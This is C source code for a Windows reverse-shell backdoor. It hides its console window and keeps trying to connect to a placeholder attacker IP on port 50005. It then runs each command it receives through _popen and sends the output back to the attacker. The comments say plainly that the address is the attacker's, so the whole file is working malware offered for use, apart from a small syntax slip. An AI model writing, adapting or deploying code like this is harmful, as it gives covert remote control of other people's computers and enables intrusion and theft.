#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <stdbool.h>

int sock;

void Shell()
{
	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while (true)
	{
		memset(buffer, 0, sizeof(buffer));
		memset(container, 0, sizeof(container));
		memset(total_response, 0, sizeof(total_response));
		recv(sock, buffer, sizeof(buffer), 0); // receives command

		if (strncmp("q", buffer, 1) == 0)
		{					   // exit command
			closesocket(sock); // closes socket
			WSACleanup();	   // windows cleanup
			exit(0);
		}
		else
		{
			FILE *fp;
			fp = _popen(buffer, "r"); // executes command
			while (fgets(container, sizeof(container), fp) != NULL)
			{									   // stores response on container
				strcat(total_response, container); // concatenates response
			}
			send(sock, total_response, sizeof(total_response), 0); // sends response
			fclose(fp);
		}
	}
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL); // Finds user current window
	ShowWindow(stealth, 0);							   // runs on background

	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;

	ServIP = "INSERT SERVER IP ADDRESS"; // IP address from attacker (ifconfig - inet)
	ServPort = 50005;					 // Listening port

	if (WSAStartup(MAKEWORD(2, 0), &wsaData)) != 0)
		{
			exit(1);
		}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

	while (true)
	{
		if (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0)
		{
			sleep(10);
		}
		else
		{
			break;
		}
	}
	Shell();

	return 0;
}